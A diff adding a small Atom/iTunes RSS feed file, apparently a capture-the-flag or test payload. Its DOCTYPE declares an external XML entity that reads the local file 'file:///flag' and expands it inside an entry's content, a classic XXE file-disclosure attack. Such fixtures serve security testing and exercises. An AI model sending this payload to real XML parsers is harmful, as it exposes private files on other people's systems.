@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE feed [<!ENTITY test SYSTEM 'file:///flag'>]>
+<feed xmlns:im="http://itunes.apple.com/rss" xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>title</title>
+    <updated>sometime</updated>
+    <entry>
+        <updated>2020-02-16T01:03:34-07:00</updated>
+        <title>No Time To Die - Billie Eilish</title>
+        <content type="html">&test;</content>
+    </entry>
+</feed>
